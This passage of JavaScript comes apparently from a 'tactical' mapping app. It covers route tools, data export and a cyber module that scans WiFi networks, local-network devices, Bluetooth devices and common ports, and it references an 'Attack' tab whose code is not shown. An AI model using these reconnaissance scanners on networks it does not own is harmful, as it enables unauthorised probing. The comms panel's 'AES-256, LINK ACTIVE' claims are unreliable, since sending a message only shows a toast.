    window.SGP.createCircularRoute = function() {
        const center = state.map.getCenter();
        const radius = 0.005;
        const points = 8;
        window.SGP.startRouteDrawing();
        for (let i = 0; i <= points; i++) {
            const angle = (i / points) * Math.PI * 2;
            const lat = center.lat + radius * Math.cos(angle);
            const lng = center.lng + radius * Math.sin(angle);
            addRoutePoint(lat, lng);
        }
        window.SGP.finishRouteDrawing();
        showToast('🔄 CIRCULAR PATROL ROUTE CREATED');
    };

    window.SGP.createPerimeter = function() {
        const center = state.map.getCenter();
        const offset = 0.004;
        window.SGP.startRouteDrawing();
        addRoutePoint(center.lat + offset, center.lng - offset);
        addRoutePoint(center.lat + offset, center.lng + offset);
        addRoutePoint(center.lat - offset, center.lng + offset);
        addRoutePoint(center.lat - offset, center.lng - offset);
        addRoutePoint(center.lat + offset, center.lng - offset);
        window.SGP.finishRouteDrawing();
        showToast('🔲 PERIMETER ROUTE CREATED');
    };

    window.SGP.reverseRoute = function() {
        if (state.routes.length === 0) { showToast('⚠ No routes to reverse'); return; }
        const last = state.routes[state.routes.length - 1];
        last.points = [...last.points].reverse();
        if (last.line) state.map.removeLayer(last.line);
        if (last.markers) last.markers.forEach(m => state.map.removeLayer(m));
        last.line = L.polyline(last.points, { color: state.routeConfig.color, weight: state.routeConfig.weight, dashArray: getRouteDashArray(), opacity: 0.8 }).addTo(state.map);
        last.markers = last.points.map(p => L.circleMarker(p, { radius: 5, color: state.routeConfig.color, fillColor: state.routeConfig.color, fillOpacity: 0.8, weight: 2 }).addTo(state.map));
        saveAllRoutes();
        showToast('↩️ ROUTE REVERSED');
        if (state.panelOpen === 'route') openPanel('route');
    };

    window.SGP.duplicateRoute = function() {
        if (state.routes.length === 0) { showToast('⚠ No routes to duplicate'); return; }
        const last = state.routes[state.routes.length - 1];
        const offset = 0.0005;
        const newPoints = last.points.map(p => [p[0] + offset, p[1] + offset]);
        const line = L.polyline(newPoints, { color: state.routeConfig.color, weight: state.routeConfig.weight, dashArray: getRouteDashArray(), opacity: 0.8 }).addTo(state.map);
        const markers = newPoints.map(p => L.circleMarker(p, { radius: 5, color: state.routeConfig.color, fillColor: state.routeConfig.color, fillOpacity: 0.8, weight: 2 }).addTo(state.map));
        state.routes.push({ id: 'route-' + Date.now(), points: newPoints, line, markers, distance: last.distance });
        saveAllRoutes();
        showToast('📋 ROUTE DUPLICATED');
        if (state.panelOpen === 'route') openPanel('route');
    };

    window.SGP.importRoute = function() {
        const textarea = document.getElementById('route-import-text');
        if (!textarea || !textarea.value.trim()) { showToast('⚠ Paste coordinates first'); return; }
        const lines = textarea.value.trim().split('\n');
        const points = [];
        lines.forEach(line => {
            const parts = line.trim().split(/[,\s]+/);
            if (parts.length >= 2) {
                const lat = parseFloat(parts[0]);
                const lng = parseFloat(parts[1]);
                if (!isNaN(lat) && !isNaN(lng)) points.push([lat, lng]);
            }
        });
        if (points.length < 2) { showToast('⚠ Need at least 2 valid coordinates'); return; }
        const line = L.polyline(points, { color: state.routeConfig.color, weight: state.routeConfig.weight, dashArray: getRouteDashArray(), opacity: 0.8 }).addTo(state.map);
        const markers = points.map(p => L.circleMarker(p, { radius: 5, color: state.routeConfig.color, fillColor: state.routeConfig.color, fillOpacity: 0.8, weight: 2 }).addTo(state.map));
        const dist = calculateRouteDistance(points);
        state.routes.push({ id: 'route-' + Date.now(), points, line, markers, distance: dist });
        saveAllRoutes();
        state.map.flyToBounds(L.latLngBounds(points), { padding: [50, 50] });
        showToast(`📥 ROUTE IMPORTED — ${points.length} waypoints, ${formatDistance(dist)}`);
        textarea.value = '';
        if (state.panelOpen === 'route') openPanel('route');
    };

    // Restore route config from localStorage
    (function() {
        const savedCfg = sgpLoad('routeConfig', null);
        if (savedCfg) Object.assign(state.routeConfig, savedCfg);
    })();

    function renderCommsPanel() {
        return `
            <div class="panel-section">
                <div class="panel-section-title">COMMUNICATIONS CHANNEL</div>
                <div style="text-align:center;padding:20px;">
                    <div style="font-size:2rem;margin-bottom:12px;opacity:0.4;">📡</div>
                    <p style="font-family:var(--font-mono);font-size:0.7rem;color:var(--text-dim);letter-spacing:1px;line-height:1.8;">
                        FREQ: <span style="color:var(--primary);">CH-7 TACTICAL</span><br>
                        ENCRYPTION: <span style="color:var(--primary);">AES-256</span><br>
                        STATUS: <span style="color:var(--primary);">LINK ACTIVE</span>
                    </p>
                </div>
            </div>
            <div class="panel-section">
                <div class="panel-section-title">SEND MESSAGE</div>
                <div class="form-group"><textarea style="width:100%;background:var(--bg-tertiary);border:1px solid var(--border);border-radius:6px;padding:10px;color:var(--text-primary);font-family:var(--font-mono);font-size:0.75rem;resize:none;outline:none;" rows="3" placeholder="Type message..."></textarea></div>
                <button class="btn btn-primary" style="width:100%;" onclick="window.SGP.sendMessage()">TRANSMIT</button>
            </div>
        `;
    }

    window.SGP.sendMessage = function () { showToast('📡 MESSAGE TRANSMITTED'); };

    window.SGP.clearAll = function () {
        state.markers.forEach(m => state.map.removeLayer(m.marker)); state.markers = [];
        state.routes.forEach(r => { state.map.removeLayer(r.line); r.markers.forEach(m => state.map.removeLayer(m)); }); state.routes = [];
        state.zones.forEach(z => state.map.removeLayer(z.polygon)); state.zones = [];
        showToast('ALL DATA CLEARED');
        if (state.panelOpen) openPanel(state.panelOpen);
    };

    window.SGP.exportData = function () {
        const data = {
            markers: state.markers.map(m => ({ name: m.name, type: m.type, notes: m.notes, lat: m.lat, lng: m.lng })),
            routes: state.routes.map(r => ({ points: r.points, distance: r.distance })),
            zones: state.zones.map(z => ({ points: z.points })),
            cellTowers: state.cellTowers,
            infrastructure: state.infraData,
            exportDate: new Date().toISOString()
        };
        const blob = new Blob([JSON.stringify(data, null, 2)], { type: 'application/json' });
        const url = URL.createObjectURL(blob);
        const a = document.createElement('a'); a.href = url; a.download = `sgp_tactical_${Date.now()}.json`; a.click();
        URL.revokeObjectURL(url);
        showToast('DATOS EXPORTADOS');
    };

    // =========================================
    // MOBILE TOOLS
    // =========================================
    function initMobileTools() {
        const mobileTools = document.createElement('div');
        mobileTools.id = 'mobile-tools';
        const tools = [
            { tool: 'pan', icon: '✥', label: 'PAN' },
            { tool: 'marker', icon: '📍', label: 'MARKER' },
            { tool: 'route', icon: '↗', label: 'ROUTE' },
            { tool: 'zone', icon: '⬜', label: 'ZONE' },
            { tool: 'measure', icon: '📏', label: 'MEASURE' },
            { tool: 'scan', icon: '📡', label: 'SCAN' },
            { tool: 'cyber', icon: '🔓', label: 'CYBER' },
            { tool: 'csi', icon: '📊', label: 'CSI' },
            { tool: 'comms', icon: '🎙️', label: 'COMMS' },
            { tool: 'tracker', icon: '🎯', label: 'TRACK' },
            { tool: 'units', icon: '👥', label: 'UNITS' },
            { tool: 'layers', icon: '🗂', label: 'CAPAS' },
            { tool: 'settings', icon: '⚙', label: 'CONFIG' }
        ];
        // These tools open side-panels (must match initToolbar logic)
        const panelTools = ['layers', 'settings', 'units', 'cyber', 'comms', 'tracker', 'route', 'marker', 'measure', 'zone', 'csi'];
        tools.forEach(t => {
            const btn = document.createElement('button');
            btn.className = 'mobile-tool-btn' + (t.tool === 'pan' ? ' active' : '');
            btn.dataset.tool = t.tool;
            btn.innerHTML = `<span style="font-size:1.1rem;">${t.icon}</span><span>${t.label}</span>`;
            btn.addEventListener('click', () => {
                if (panelTools.includes(t.tool)) {
                    if (state.panelOpen === t.tool) closePanel(); else openPanel(t.tool);
                } else {
                    selectTool(t.tool);
                }
                // Highlight active mobile button
                document.querySelectorAll('.mobile-tool-btn').forEach(b => {
                    b.classList.toggle('active', b.dataset.tool === t.tool);
                });
            });
            mobileTools.appendChild(btn);
        });
        document.getElementById('app').appendChild(mobileTools);
    }

    // =========================================
    // MENU BUTTON
    // =========================================
    document.getElementById('btn-menu').addEventListener('click', () => {
        if (state.panelOpen === 'settings') closePanel();
        else openPanel('settings');
    });

    // =========================================
    // TOAST
    // =========================================
    let toastTimeout;
    function showToast(message) {
        const toast = document.getElementById('toast');
        const msg = document.getElementById('toast-msg');
        msg.textContent = message;
        toast.classList.remove('hidden');
        toast.style.animation = 'none'; toast.offsetHeight; toast.style.animation = 'toast-in 0.3s ease';
        clearTimeout(toastTimeout);
        toastTimeout = setTimeout(() => { toast.classList.add('hidden'); }, 3000);
    }

    // =========================================
    // CYBER MODULE — WiFi / Network / BLE
    // =========================================
    const cyberState = {
        activeTab: 'wifi',
        wifiNetworks: [],
        networkDevices: [],
        bleDevices: [],
        portResults: null,
        knownDevices: JSON.parse(localStorage.getItem('sgp_known_devices') || '{}'),
        scanning: { wifi: false, network: false, ble: false, ports: false },
        networkInfo: null,
        wifiInfo: null
    };

    // Check if Capacitor native plugin is available
    function getCyberPlugin() {
        if (window.Capacitor && window.Capacitor.Plugins && window.Capacitor.Plugins.CyberPlugin) {
            return window.Capacitor.Plugins.CyberPlugin;
        }
        return null;
    }

    function renderCyberPanel() {
        return `
            <div class="cyber-tabs" id="cyber-tabs">
                <button class="cyber-tab active" data-tab="wifi">📶 WiFi</button>
                <button class="cyber-tab" data-tab="network">🔍 Network</button>
                <button class="cyber-tab" data-tab="ble">📡 BLE</button>
                <button class="cyber-tab" data-tab="radar">🛸 Radar</button>
                <button class="cyber-tab" data-tab="ports">🔒 Ports</button>
                <button class="cyber-tab" data-tab="ataque">⚔ Attack</button>
            </div>
            <div id="cyber-content">
                ${renderCyberWifiTab()}
            </div>
        `;
    }

    function initCyberTabs() {
        document.querySelectorAll('.cyber-tab').forEach(tab => {
            tab.addEventListener('click', () => {
                cyberState.activeTab = tab.dataset.tab;
                document.querySelectorAll('.cyber-tab').forEach(t => t.classList.toggle('active', t === tab));
                const content = document.getElementById('cyber-content');
                switch (tab.dataset.tab) {
                    case 'wifi': content.innerHTML = renderCyberWifiTab(); break;
                    case 'network': content.innerHTML = renderCyberNetworkTab(); break;
                    case 'ble': content.innerHTML = renderCyberBleTab(); break;
                    case 'radar': content.innerHTML = renderCyberRadarTab(); initRadarSweep(); break;
                    case 'ports': content.innerHTML = renderCyberPortsTab(); break;
                    case 'ataque': content.innerHTML = renderCyberAttackTab(); initAttackEvents(); break;
                }
            });
        });
    }

    // ---- WiFi Tab ----
    function renderCyberWifiTab() {
        const scanning = cyberState.scanning.wifi;
        const nets = cyberState.wifiNetworks;
        const info = cyberState.wifiInfo;

        let connectedHtml = '';
        if (info) {
            connectedHtml = `
                <div class="cyber-section">
                    <div class="cyber-section-title">📶 CONNECTED NETWORK</div>
                    <div class="cyber-connected-card">
                        <div class="cyber-connected-ssid">${info.ssid || 'N/A'}</div>
                        <div class="cyber-connected-details">
                            <div class="cyber-detail-row"><span>IP:</span><span class="cyber-val">${info.ip || '--'}</span></div>
                            <div class="cyber-detail-row"><span>Gateway:</span><span class="cyber-val">${info.gateway || '--'}</span></div>
                            <div class="cyber-detail-row"><span>DNS:</span><span class="cyber-val">${info.dns1 || '--'}</span></div>
                            <div class="cyber-detail-row"><span>BSSID:</span><span class="cyber-val">${info.bssid || '--'}</span></div>
                            <div class="cyber-detail-row"><span>Channel:</span><span class="cyber-val">${info.channel || '--'}</span></div>
                            <div class="cyber-detail-row"><span>Frequency:</span><span class="cyber-val">${info.frequency || '--'} MHz</span></div>
                            <div class="cyber-detail-row"><span>Speed:</span><span class="cyber-val">${info.linkSpeed || '--'} Mbps</span></div>
                            <div class="cyber-detail-row"><span>Signal:</span><span class="cyber-val">${info.rssi || '--'} dBm (${info.signalPercent || '--'}%)</span></div>
                            <div class="cyber-detail-row"><span>Netmask:</span><span class="cyber-val">${info.netmask || '--'}</span></div>
                            <div class="cyber-detail-row"><span>DHCP:</span><span class="cyber-val">${info.dhcpServer || '--'}</span></div>
                        </div>
                    </div>
                </div>`;
        }

        let networksHtml = '';
        if (nets.length > 0) {
            const sorted = [...nets].sort((a, b) => b.rssi - a.rssi);
            networksHtml = sorted.map(n => {
                const pct = n.signalPercent || 0;
                const barColor = pct > 70 ? '#00ff41' : pct > 40 ? '#ffaa00' : '#ff2d2d';
                const secColor = n.security === 'OPEN' ? '#ff2d2d' : '#00ff41';
                const secIcon = n.security === 'OPEN' ? '🔓' : '🔒';
                return `
                    <div class="cyber-wifi-item">
                        <div class="cyber-wifi-bar-wrap">
                            <div class="cyber-wifi-bar" style="width:${pct}%;background:${barColor}"></div>
                        </div>
                        <div class="cyber-wifi-info">
                            <div class="cyber-wifi-ssid">${n.ssid}</div>
                            <div class="cyber-wifi-meta">
                                <span>${n.rssi} dBm</span>
                                <span>CH ${n.channel}</span>
                                <span>${n.band}</span>
                                <span style="color:${secColor}">${secIcon} ${n.security}</span>
                                <span>${n.width || ''}</span>
                            </div>
                            <div class="cyber-wifi-bssid">${n.bssid}</div>
                        </div>
                    </div>`;
            }).join('');
        }

        return `
            ${connectedHtml}
            <div class="cyber-section">
                <div class="cyber-section-title">📡 NETWORKS DETECTED (${nets.length})</div>
                <button class="btn btn-primary cyber-scan-btn" onclick="window.SGP.cyberScanWifi()" ${scanning ? 'disabled' : ''}>
                    ${scanning ? '<span class="cyber-spinner"></span> SCANNING...' : '📡 SCAN WiFi NETWORKS'}
                </button>
                <div class="cyber-wifi-list">${networksHtml || '<div class="cyber-empty">Press SCAN to detect networks</div>'}</div>
            </div>
            ${nets.length > 0 ? renderWifiChannelChart(nets) : ''}
        `;
    }

    function renderWifiChannelChart(nets) {
        // Simple channel usage visualization
        const channels = {};
        nets.forEach(n => {
            const ch = n.channel || 0;
            if (!channels[ch]) channels[ch] = [];
            channels[ch].push(n);
        });

        const maxCh = Math.max(14, ...Object.keys(channels).map(Number));
        let barsHtml = '';
        for (let ch = 1; ch <= Math.min(maxCh, 14); ch++) {
            const count = channels[ch] ? channels[ch].length : 0;
            const maxCount = Math.max(1, ...Object.values(channels).map(c => c.length));
            const height = count > 0 ? Math.max(8, (count / maxCount) * 60) : 2;
            const color = count === 0 ? 'var(--border)' : count <= 2 ? '#00ff41' : count <= 4 ? '#ffaa00' : '#ff2d2d';
            barsHtml += `
                <div class="cyber-ch-bar-wrap">
                    <div class="cyber-ch-bar" style="height:${height}px;background:${color}"></div>
                    <div class="cyber-ch-label">${ch}</div>
                    ${count > 0 ? `<div class="cyber-ch-count">${count}</div>` : ''}
                </div>`;
        }

        return `
            <div class="cyber-section">
                <div class="cyber-section-title">📊 2.4GHz CHANNEL USAGE</div>
                <div class="cyber-channel-chart">${barsHtml}</div>
            </div>`;
    }

    window.SGP.cyberScanWifi = async function() {
        const plugin = getCyberPlugin();
        cyberState.scanning.wifi = true;
        refreshCyberTab();

        if (plugin) {
            try {
                // Get connected WiFi info first
                const info = await plugin.getConnectedWifiInfo();
                cyberState.wifiInfo = info;

                // Then scan networks
                const result = await plugin.scanWifiNetworks();
                cyberState.wifiNetworks = result.networks || [];
                showToast(`📶 ${cyberState.wifiNetworks.length} WiFi NETWORKS DETECTED`);
            } catch (e) {
                showToast('⚠ ERROR: ' + (e.message || 'Permissions required'));
                // Demo data for browser testing
                generateDemoWifiData();
            }
        } else {
            // Running in browser — generate demo data
            showToast('📶 DEMO MODE — Install on Android for real data');
            generateDemoWifiData();
        }

        cyberState.scanning.wifi = false;
        refreshCyberTab();
    };

    function generateDemoWifiData() {
        const demoNetworks = [
            { ssid: 'MiWiFi_Home', bssid: 'A4:2B:B0:1A:2C:3D', rssi: -42, frequency: 2437, channel: 6, band: '2.4GHz', security: 'WPA2', width: '40 MHz', signalPercent: 82 },
            { ssid: 'Vecino_5G', bssid: '14:CC:20:4E:5F:60', rssi: -58, frequency: 5180, channel: 36, band: '5GHz', security: 'WPA3', width: '80 MHz', signalPercent: 62 },
            { ssid: 'MOVISTAR_F8A2', bssid: '00:1E:10:7A:8B:9C', rssi: -67, frequency: 2462, channel: 11, band: '2.4GHz', security: 'WPA2', width: '20 MHz', signalPercent: 45 },
            { ssid: 'vodafone_FREE', bssid: '08:D4:2B:AA:BB:CC', rssi: -71, frequency: 2412, channel: 1, band: '2.4GHz', security: 'OPEN', width: '20 MHz', signalPercent: 38 },
            { ssid: 'ORANGE-4521', bssid: '00:18:82:DD:EE:FF', rssi: -75, frequency: 2437, channel: 6, band: '2.4GHz', security: 'WPA2', width: '20 MHz', signalPercent: 30 },
            { ssid: '[OCULTA]', bssid: '50:C7:BF:11:22:33', rssi: -78, frequency: 2427, channel: 4, band: '2.4GHz', security: 'WPA2', width: '20 MHz', signalPercent: 25 },
            { ssid: 'IoT_Device_Net', bssid: '30:AE:A4:44:55:66', rssi: -80, frequency: 2452, channel: 9, band: '2.4GHz', security: 'WPA2', width: '20 MHz', signalPercent: 20 },
            { ssid: 'HP-Print-A3', bssid: '00:01:E6:77:88:99', rssi: -83, frequency: 2437, channel: 6, band: '2.4GHz', security: 'WPA2', width: '20 MHz', signalPercent: 15 },
        ];
        cyberState.wifiNetworks = demoNetworks;
        cyberState.wifiInfo = {
            ssid: 'MiWiFi_Home', bssid: 'A4:2B:B0:1A:2C:3D', rssi: -42, linkSpeed: 144,
            frequency: 2437, channel: 6, ip: '192.168.1.105', gateway: '192.168.1.1',
            netmask: '255.255.255.0', dns1: '8.8.8.8', dns2: '8.8.4.4',
            dhcpServer: '192.168.1.1', signalPercent: 82, macAddress: '02:00:00:00:00:00'
        };
    }

    // ---- Network Tab (NetCut style) ----
    function renderCyberNetworkTab() {
        const scanning = cyberState.scanning.network;
        const devices = cyberState.networkDevices;
        const info = cyberState.networkInfo;

        let infoHtml = '';
        if (info) {
            infoHtml = `
                <div class="cyber-section">
                    <div class="cyber-section-title">🌐 INFO DE RED</div>
                    <div class="cyber-connected-details" style="margin-bottom:8px;">
                        <div class="cyber-detail-row"><span>Subred:</span><span class="cyber-val">${info.subnet || '--'}</span></div>
                        <div class="cyber-detail-row"><span>Mi IP:</span><span class="cyber-val">${info.myIp || '--'}</span></div>
                        <div class="cyber-detail-row"><span>Gateway:</span><span class="cyber-val">${info.gateway || '--'}</span></div>
                    </div>
                </div>`;
        }

        // Separate known vs unknown devices
        const known = devices.filter(d => cyberState.knownDevices[d.mac]);
        const unknown = devices.filter(d => !cyberState.knownDevices[d.mac] && d.mac !== 'UNKNOWN');

        let devicesHtml = '';
        if (devices.length > 0) {
            if (unknown.length > 0) {
                devicesHtml += `<div class="cyber-section-title" style="color:var(--danger);margin-top:8px;">⚠ UNKNOWN / INTRUDERS (${unknown.length})</div>`;
                devicesHtml += unknown.map(d => renderNetworkDevice(d, false)).join('');
            }
            if (known.length > 0) {
                devicesHtml += `<div class="cyber-section-title" style="color:var(--primary);margin-top:12px;">✅ KNOWN (${known.length})</div>`;
                devicesHtml += known.map(d => renderNetworkDevice(d, true)).join('');
            }
            // Devices with unknown MAC
            const noMac = devices.filter(d => d.mac === 'UNKNOWN');
            if (noMac.length > 0) {
                devicesHtml += `<div class="cyber-section-title" style="color:var(--warning);margin-top:12px;">❓ NO MAC (${noMac.length})</div>`;
                devicesHtml += noMac.map(d => renderNetworkDevice(d, false)).join('');
            }
        }

        return `
            ${infoHtml}
            <div class="cyber-section">
                <div class="cyber-section-title">🔍 NETWORK DEVICES (${devices.length})</div>
                <button class="btn btn-primary cyber-scan-btn" onclick="window.SGP.cyberScanNetwork()" ${scanning ? 'disabled' : ''}>
                    ${scanning ? '<span class="cyber-spinner"></span> SCANNING NETWORK...' : '🔍 SCAN DEVICES (NETCUT)'}
                </button>
                ${devices.length > 0 ? `
                    <div class="cyber-device-summary">
                        <div class="cyber-summary-item">
                            <span class="cyber-summary-num" style="color:var(--primary)">${known.length}</span>
                            <span class="cyber-summary-label">KNOWN</span>
                        </div>
                        <div class="cyber-summary-item">
                            <span class="cyber-summary-num" style="color:var(--danger)">${unknown.length}</span>
                            <span class="cyber-summary-label">INTRUDERS</span>
                        </div>
                        <div class="cyber-summary-item">
                            <span class="cyber-summary-num" style="color:var(--info)">${devices.length}</span>
                            <span class="cyber-summary-label">TOTAL</span>
                        </div>
                    </div>
                ` : ''}
                <div class="cyber-device-list">${devicesHtml || '<div class="cyber-empty">Scan your network to detect devices</div>'}</div>
            </div>
        `;
    }

    function renderNetworkDevice(device, isKnown) {
        const vendor = (typeof lookupVendor === 'function') ? lookupVendor(device.mac) : 'Unknown';
        const nickname = cyberState.knownDevices[device.mac] || '';
        const isGw = device.isGateway;
        const borderColor = isGw ? 'var(--info)' : isKnown ? 'var(--primary)' : 'var(--danger)';
        const icon = isGw ? '🌐' : vendor.includes('Apple') ? '🍎' : vendor.includes('Samsung') ? '📱' :
            vendor.includes('TP-Link') || vendor.includes('Netgear') || vendor.includes('ASUS') || vendor.includes('D-Link') ? '📡' :
            vendor.includes('Amazon') ? '📦' : vendor.includes('Espressif') || vendor.includes('Raspberry') ? '🔌' :
            vendor.includes('Nintendo') || vendor.includes('Sony') ? '🎮' : isKnown ? '✅' : '❓';

        return `
            <div class="cyber-device-item" style="border-left:3px solid ${borderColor}">
                <div class="cyber-device-icon">${icon}</div>
                <div class="cyber-device-info">
                    <div class="cyber-device-name">${nickname || vendor}${isGw ? ' (ROUTER)' : ''}</div>
                    <div class="cyber-device-ip">${device.ip}</div>
                    <div class="cyber-device-mac">${device.mac}</div>
                    ${device.hostname && device.hostname !== device.ip ? `<div class="cyber-device-host">${device.hostname}</div>` : ''}
                </div>
                <div class="cyber-device-actions">
                    ${!isKnown && device.mac !== 'UNKNOWN' ? `<button class="cyber-small-btn known-btn" onclick="window.SGP.markDeviceKnown('${device.mac}','${vendor}')" title="Mark as known">✅</button>` : ''}
                    ${device.mac !== 'UNKNOWN' ? `<button class="cyber-small-btn port-btn" onclick="window.SGP.cyberScanDevicePorts('${device.ip}')" title="Scan ports">🔒</button>` : ''}
                </div>
            </div>`;
    }

    window.SGP.markDeviceKnown = function(mac, defaultName) {
        const name = prompt('Name for this device:', defaultName || mac);
        if (name) {
            cyberState.knownDevices[mac] = name;
            localStorage.setItem('sgp_known_devices', JSON.stringify(cyberState.knownDevices));
            showToast(`✅ ${name} — MARKED AS KNOWN`);
            refreshCyberTab();
        }
    };

    window.SGP.cyberScanNetwork = async function() {
        cyberState.scanning.network = true;
        refreshCyberTab();

        const plugin = getCyberPlugin();
        if (plugin) {
            try {
                const result = await plugin.scanLocalNetwork({ timeout: 400 });
                cyberState.networkDevices = result.devices || [];
                cyberState.networkInfo = { subnet: result.subnet, myIp: result.myIp, gateway: result.gateway };
                // Enrich with vendor names
                cyberState.networkDevices.forEach(d => {
                    if (d.mac && typeof lookupVendor === 'function') {
                        d.vendor = lookupVendor(d.mac);
                    }
                });
                showToast(`🔍 ${cyberState.networkDevices.length} DEVICES FOUND`);
            } catch (e) {
                showToast('⚠ ERROR: ' + (e.message || 'Scan failed'));
                generateDemoNetworkData();
            }
        } else {
            showToast('🔍 DEMO MODE — Install on Android for real data');
            generateDemoNetworkData();
        }

        cyberState.scanning.network = false;
        refreshCyberTab();
    };

    function generateDemoNetworkData() {
        cyberState.networkDevices = [
            { ip: '192.168.1.1', mac: 'A4:2B:B0:00:11:22', hostname: 'router.local', isGateway: true },
            { ip: '192.168.1.105', mac: '14:10:9F:AA:BB:CC', hostname: 'mi-iphone', isGateway: false },
            { ip: '192.168.1.108', mac: '08:D4:2B:DD:EE:FF', hostname: 'samsung-tv', isGateway: false },
            { ip: '192.168.1.112', mac: '30:AE:A4:11:22:33', hostname: 'esp32-sensor', isGateway: false },
            { ip: '192.168.1.115', mac: '50:DC:E7:44:55:66', hostname: 'alexa-echo', isGateway: false },
            { ip: '192.168.1.118', mac: '00:01:E6:77:88:99', hostname: 'hp-printer', isGateway: false },
            { ip: '192.168.1.120', mac: 'B8:27:EB:AA:BB:CC', hostname: 'raspberrypi', isGateway: false },
            { ip: '192.168.1.155', mac: '4C:49:E3:DE:AD:00', hostname: '192.168.1.155', isGateway: false },
        ];
        cyberState.networkInfo = { subnet: '192.168.1.0/24', myIp: '192.168.1.105', gateway: '192.168.1.1' };
        // Mark some as known for demo
        if (Object.keys(cyberState.knownDevices).length === 0) {
            cyberState.knownDevices['A4:2B:B0:00:11:22'] = 'Router TP-Link';
            cyberState.knownDevices['14:10:9F:AA:BB:CC'] = 'My iPhone';
            cyberState.knownDevices['08:D4:2B:DD:EE:FF'] = 'Samsung TV';
            localStorage.setItem('sgp_known_devices', JSON.stringify(cyberState.knownDevices));
        }
    }

    // ---- BLE Tab ----
    function renderCyberBleTab() {
        const scanning = cyberState.scanning.ble;
        const devices = cyberState.bleDevices;

        let devicesHtml = '';
        if (devices.length > 0) {
            const sorted = [...devices].sort((a, b) => b.rssi - a.rssi);
            devicesHtml = sorted.map(d => {
                const pct = Math.min(100, Math.max(0, 100 + d.rssi));
                const barColor = pct > 60 ? '#00ff41' : pct > 30 ? '#ffaa00' : '#ff2d2d';
                const typeIcon = d.deviceClass === 'PHONE' ? '📱' : d.deviceClass === 'COMPUTER' ? '💻' :
                    d.deviceClass === 'AUDIO_VIDEO' ? '🎧' : d.deviceClass === 'PERIPHERAL' ? '⌨️' :
                    d.deviceClass === 'WEARABLE' ? '⌚' : d.deviceClass === 'HEALTH' ? '💓' :
                    d.type === 'BLE' ? '📡' : '📶';

                return `
                    <div class="cyber-ble-item">
                        <div class="cyber-ble-icon">${typeIcon}</div>
                        <div class="cyber-ble-info">
                            <div class="cyber-ble-name">${d.name || 'Unknown'}</div>
                            <div class="cyber-ble-meta">
                                <span>${d.rssi} dBm</span>
                                <span>~${d.distanceMeters || '?'}m</span>
                                <span>${d.type || 'BLE'}</span>
                                <span>${d.deviceClass || ''}</span>
                            </div>
                            <div class="cyber-ble-addr">${d.address}</div>
                        </div>
                        <div class="cyber-ble-signal">
                            <div class="cyber-ble-signal-bar" style="height:${pct}%;background:${barColor}"></div>
                        </div>
                    </div>`;
            }).join('');
        }

        return `
            <div class="cyber-section">
                <div class="cyber-section-title">📡 BLUETOOTH DEVICES (${devices.length})</div>
                <button class="btn btn-primary cyber-scan-btn" onclick="window.SGP.cyberScanBle()" ${scanning ? 'disabled' : ''}>
                    ${scanning ? '<span class="cyber-spinner"></span> SCANNING BLE...' : '📡 SCAN BLUETOOTH'}
                </button>
                <div class="cyber-ble-list">${devicesHtml || '<div class="cyber-empty">Scan to detect nearby Bluetooth devices</div>'}</div>
            </div>
        `;
    }

    window.SGP.cyberScanBle = async function() {
        cyberState.scanning.ble = true;
        refreshCyberTab();
        showToast('📡 SCANNING BLUETOOTH FOR 8 SECONDS...');

        const plugin = getCyberPlugin();
        if (plugin) {
            try {
                const result = await plugin.scanBleDevices({ duration: 8000 });
                cyberState.bleDevices = result.devices || [];
                showToast(`📡 ${cyberState.bleDevices.length} BLE DEVICES FOUND`);
            } catch (e) {
                showToast('⚠ ERROR BLE: ' + (e.message || 'Bluetooth not available'));
                generateDemoBleData();
            }
        } else {
            await new Promise(r => setTimeout(r, 2000));
            showToast('📡 DEMO MODE — Install on Android for real BLE');
            generateDemoBleData();
        }

        cyberState.scanning.ble = false;
        refreshCyberTab();
    };

    function generateDemoBleData() {
        cyberState.bleDevices = [
            { name: 'AirPods Pro', address: 'A4:C1:38:AA:BB:CC', rssi: -45, type: 'BLE', deviceClass: 'AUDIO_VIDEO', distanceMeters: 1.2, bondState: 0 },
            { name: 'Mi Band 7', address: '78:02:F8:11:22:33', rssi: -52, type: 'BLE', deviceClass: 'WEARABLE', distanceMeters: 2.1, bondState: 0 },
            { name: 'Galaxy Watch', address: '08:D4:2B:44:55:66', rssi: -58, type: 'DUAL', deviceClass: 'WEARABLE', distanceMeters: 3.5, bondState: 0 },
            { name: 'Unknown', address: 'FF:23:45:67:89:AB', rssi: -68, type: 'BLE', deviceClass: 'MISC', distanceMeters: 6.2, bondState: 0 },
            { name: 'JBL Flip 6', address: '00:18:09:CD:EF:01', rssi: -72, type: 'CLASSIC', deviceClass: 'AUDIO_VIDEO', distanceMeters: 8.5, bondState: 0 },
            { name: 'Unknown', address: 'B0:E2:35:23:45:67', rssi: -79, type: 'BLE', deviceClass: 'MISC', distanceMeters: 12.0, bondState: 0 },
            { name: 'Tile Mate', address: '1C:A2:B3:89:AB:CD', rssi: -82, type: 'BLE', deviceClass: 'MISC', distanceMeters: 15.8, bondState: 0 },
        ];
    }

    // ---- Ports Tab ----
    function renderCyberPortsTab() {
        const scanning = cyberState.scanning.ports;
        const results = cyberState.portResults;

        let resultsHtml = '';
        if (results) {
            resultsHtml = `
                <div class="cyber-section">
                    <div class="cyber-section-title">🎯 ${results.host} — ${results.count} OPEN PORTS / ${results.portsScanned}</div>
                    ${results.openPorts.length > 0 ? results.openPorts.map(p => `
                        <div class="cyber-port-item">
                            <span class="cyber-port-num">${p.port}</span>
                            <span class="cyber-port-service">${p.service}</span>
                            <span class="cyber-port-state">${p.state}</span>
                        </div>
                    `).join('') : '<div class="cyber-empty">No open ports found</div>'}
                </div>`;
        }

        return `
            <div class="cyber-section">
                <div class="cyber-section-title">🔒 PORT SCANNER</div>
                <div class="form-group" style="margin-bottom:8px;">
                    <label style="font-family:var(--font-mono);font-size:0.6rem;color:var(--text-dim);letter-spacing:1px;">TARGET IP / HOST</label>
                    <input type="text" id="cyber-port-host" placeholder="192.168.1.1" value="${cyberState.networkInfo?.gateway || ''}"
                        style="width:100%;background:var(--bg-tertiary);border:1px solid var(--border);border-radius:6px;padding:8px 10px;color:var(--primary);font-family:var(--font-mono);font-size:0.8rem;outline:none;">
                </div>
                <button class="btn btn-primary cyber-scan-btn" onclick="window.SGP.cyberScanPorts()" ${scanning ? 'disabled' : ''}>
                    ${scanning ? '<span class="cyber-spinner"></span> SCANNING PORTS...' : '🔒 SCAN COMMON PORTS'}
                </button>
                <p style="font-family:var(--font-mono);font-size:0.5rem;color:var(--text-dim);margin-top:4px;line-height:1.6;">
                    Scans 23 common ports (SSH, HTTP, SMB, RDP, etc.)
                </p>
            </div>
            ${resultsHtml}
        `;
    }

